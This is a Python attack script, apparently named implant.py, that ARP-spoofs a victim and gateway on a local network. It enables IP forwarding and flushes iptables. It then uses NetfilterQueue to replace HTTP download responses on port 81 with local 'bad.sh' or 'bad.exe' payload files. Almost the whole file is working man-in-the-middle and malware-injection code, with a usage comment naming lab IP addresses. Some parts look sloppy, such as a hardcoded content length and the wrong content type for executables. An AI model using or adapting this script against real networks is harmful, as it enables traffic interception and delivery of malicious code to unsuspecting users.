#!/usr/bin/python

import sys
import os
import time
from scapy.all import *
from getmac import get_mac_address
from netfilterqueue import NetfilterQueue
import socket
import netifaces as ni
import threading
import traceback

try:
    interface = 'eth0'
    victim_ip = sys.argv[1]
    gate_ip = sys.argv[2]
except KeyboardInterrupt:
    print('[*] arguments not given correctly, commencing shutdown')
    sys.exit(1)

ni.ifaddresses('eth0')
my_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

print('[*] running IP forward enabling sys command...')
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
    try:
        var = sr1(ARP(op=ARP.who_has, psrc = my_ip, pdst = IP))
        return var[0][ARP].hwsrc
    except Exception as e:
        print(e)

def reARP():
	print('[*] Gracefully re-arping, as requested...')
	send(ARP(op = 2, pdst = gate_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_MAC), count = 4)
	send(ARP(op = 2, pdst = victim_ip, psrc = gate_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gate_MAC), count = 4)
	print('[*] disabling ip forwarding...')
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print ('[*] re-arped, shutting down')
	sys.exit(1)

def spoof(gate, vict):
    # send usage: send(ARP(op=2, pdst=victIP, psrc = gateIP, hwdst = victMAC))
    try:
	send(ARP(op = 2, pdst = victim_ip, psrc = gate_ip, hwdst= vict))
	send(ARP(op = 2, pdst = gate_ip, psrc = victim_ip, hwdst= gate))
    except KeyboardInterrupt:
        print('keyboard exception')
   # except Exception as e:
    #    print(e)
     #   pass

gate_MAC = get_mac(gate_ip)
victim_MAC = get_mac(victim_ip)
print '[*] victim ip and mac: ', victim_ip, victim_MAC
print '[*] gateway ip and mac: ', gate_ip, gate_MAC

#function to bind to NFQUEUE, modify packets to poison their download reqs
def modify(packet):
    try:
        pkt = IP(packet.get_payload())
        #print(pkt.show())
        if 'ontent-type' in str(pkt):
            #print 'SH REQ CONFIRMED!!!!!!'
            #print(pkt.show())
            load = open('bad.sh', 'rb')
            pack = load.read()
            ip = IP(src= pkt['IP'].src, dst= pkt['IP'].dst)
            tcp = TCP(sport= pkt['TCP'].sport, dport= pkt['TCP'].dport, ack = pkt['TCP'].ack, seq= pkt['TCP'].seq, flags = pkt['TCP'].flags)
            load = b'= Server: SimpleHTTP/0.6 Python/2.7.6\r\nDate: Wed, 22 May 2019 16:12:14 GMT\r\nContent-type: text/x-sh\r\nContent-Length: 37\r\nLast-Modified: '+str(time.time())+'\r\n\r\n'+str(pack.encode())+'\n'
            new_response = ip/tcp/load
            packet.set_payload(str(new_response))
        if 'ontent-type: app' in str(pkt):
            load = open('bad.exe', 'rb')
            pack = load.read()
            ip = IP(src= pkt['IP'].src, dst= pkt['IP'].dst)
            tcp = TCP(sport= pkt['TCP'].sport, dport= pkt['TCP'].dport, ack = pkt['TCP'].ack, seq= pkt['TCP'].seq, flags = pkt['TCP'].flags)
            load = b'= Server: SimpleHTTP/0.6 Python/2.7.6\r\nDate: Wed, 22 May 2019 16:12:14 GMT\r\nContent-type: text/x-sh\r\nContent-Length: 37\r\nLast-Modified: '+str(time.time())+'\r\n\r\n'+str(pack.encode())+'\n'
            new_response = ip/tcp/load
            packet.set_payload(str(new_response))
        packet.accept()
    except Exception as e:
        traceback.print_exc()
        print e

print('[*] flushing current iptables rule...')
os.system('iptables -F')
print('[*] setting iptables rule(s)...')
os.system('iptables -A FORWARD -p tcp --dport 81 -j NFQUEUE --queue-num 2')
os.system('iptables -A FORWARD -p tcp --sport 81 -j NFQUEUE --queue-num 2')

th = threading.Thread(target=spoof, args = (gate_MAC, victim_MAC))
th.start()

nfqueue = NetfilterQueue()
nfqueue.bind(2, modify)
#nfqueue.run()

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('[*] flushing iptables')
    os.system('iptables -F')
    reARP()

#testing: ./implant.py <TARGET IP> <GATEWAY IP>
# ./implant.py 172.30.122.29 172.30.122.28

